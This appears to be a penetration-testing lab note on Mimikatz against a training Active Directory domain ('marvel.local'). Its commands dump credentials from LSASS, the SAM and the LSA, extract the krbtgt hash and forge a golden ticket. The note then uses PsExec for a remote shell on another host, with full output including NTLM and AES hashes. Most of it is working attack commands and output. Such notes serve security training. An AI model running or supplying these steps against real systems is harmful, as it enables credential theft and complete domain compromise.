# Mimikatz

- Once we get Domain Admin we can use mimikatz to dump the creds
- Launch mimikatz from the target and run `privilege::debug` (will allow us to debug processes): 
  ```
  C:\Users\Administrator\Downloads>mimikatz.exe

    .#####.   mimikatz 2.2.0 (x86) #19041 Aug 10 2021 17:20:39
   .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
   ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
   ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
   '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
    '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

  mimikatz # privilege::debug
  Privilege '20' OK

  mimikatz #
  ```
- Can be useful on a compromised regular computer `sekurlsa::logonpasswords` we get NTLM (v1) hash and could try to use pass-the-hash.
  - With wdigest we can see passwords in cleartext (prior to win 7) after only deactivate so possible to reactivate it with mimikats and wait for somebody to log on.
  - Dump the sam `lsadump::sam` or `lsadump::sam /patch`
  - Dump lsa (Local Security Authority)  `lsadump::lsa /patch` we get ntlm hashes and try to crack them.
 

## Mimikatz - Golden Ticket Attack

- With a Golden ticket we can get access to any resource and system on the domain = complete access to the entire domain
 - `lsadump::lsa /inject /name:krbtgt`
    ```
    mimikatz # lsadump::lsa /inject /name:krbtgt
    Domain : MARVEL / S-1-5-21-1324315119-2624990979-1304259423

    RID  : 000001f6 (502)
    User : krbtgt

     * Primary
        NTLM : 0afd880b6c9c7207067f0e15dab634a9
        LM   :
      Hash NTLM: 0afd880b6c9c7207067f0e15dab634a9
        ntlm- 0: 0afd880b6c9c7207067f0e15dab634a9
        lm  - 0: 662f5b48c70e0c5211f72eabdcffcfa6

     * WDigest
      [STRIPPED]

     * Kerberos
        Default Salt : MARVEL.LOCALkrbtgt
        Credentials
          des_cbc_md5       : 074fc873e6c40157

     * Kerberos-Newer-Keys
        Default Salt : MARVEL.LOCALkrbtgt
        Default Iterations : 4096
        Credentials
          aes256_hmac       (4096) : e5755cc451bc84fbe6004005f363e0425838d134306ffb0cb3a2f323e02a8ac9
          aes128_hmac       (4096) : a14075bef6022520025c4054880073a2
          des_cbc_md5       (4096) : 074fc873e6c40157

     * NTLM-Strong-NTOWF
        Random Value : 97decc0bc95a167ce7ebc2dd728fb83a
    ```
- Take note of:
  - Domain SID: `S-1-5-21-1324315119-2624990979-1304259423`
  - NTLM Hash of krbtgt: `0afd880b6c9c7207067f0e15dab634a9`
- Pass the ticket: ` kerberos::golden /User:AnyDoesNotNeedToExist /domain:marvel.local /sid:S-1-5-21-1324315119-2624990979-1304259423 /krbtgt:0afd880b6c9c7207067f0e15dab634a9 /id:500 /ptt`
```
 mimikatz # kerberos::golden /User:AnyDoesNotNeedToExist /domain:marvel.local /sid:S-1-5-21-1324315119-2624990979-1304259423 /krbtgt:0afd880b6c9c7207067f0e15dab634a9 /id:500 /ptt
User      : AnyDoesNotNeedToExist
Domain    : marvel.local (MARVEL)
SID       : S-1-5-21-1324315119-2624990979-1304259423
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 0afd880b6c9c7207067f0e15dab634a9 - rc4_hmac_nt
Lifetime  : 2/12/2022 10:32:39 AM ; 2/10/2032 10:32:39 AM ; 2/10/2032 10:32:39 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'AnyDoesNotNeedToExist @ marvel.local' successfully submitted for current session
```
- Get a cmd prmpt using the session and golden ticket `misc::cmd`
- We can access to anything on the network:
  ```
  C:\Users\Administrator\Downloads>dir \\THEDEFENDER\c$
   Volume in drive \\THEDEFENDER\c$ has no label.
   Volume Serial Number is 22E3-F05A

   Directory of \\THEDEFENDER\c$

  12/07/2019  01:14 AM    <DIR>          PerfLogs
  01/28/2022  02:29 PM    <DIR>          Program Files
  10/06/2021  05:58 AM    <DIR>          Program Files (x86)
  01/28/2022  04:33 PM    <DIR>          Share
  02/12/2022  05:34 AM    <DIR>          Users
  02/04/2022  01:19 PM    <DIR>          Windows
                 0 File(s)              0 bytes
                 6 Dir(s)  42,889,506,816 bytes free

  C:\Users\Administrator\Downloads>
  ```
- We can then use [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) to get a shell on a machine from the network 
  - We download psexec on our compromised machine
  - We get the shell 
    ```
    C:\Users\Administrator\Downloads\PSTools>PsExec.exe \\THEDEFENDER cmd.exe

    PsExec v2.34 - Execute processes remotely
    Copyright (C) 2001-2021 Mark Russinovich
    Sysinternals - www.sysinternals.com


    Microsoft Windows [Version 10.0.19044.1288]
    (c) Microsoft Corporation. All rights reserved.

    C:\Windows\system32>hostname
    THEDEFENDER
    ```

## Mimikatz - Resources
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz - Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
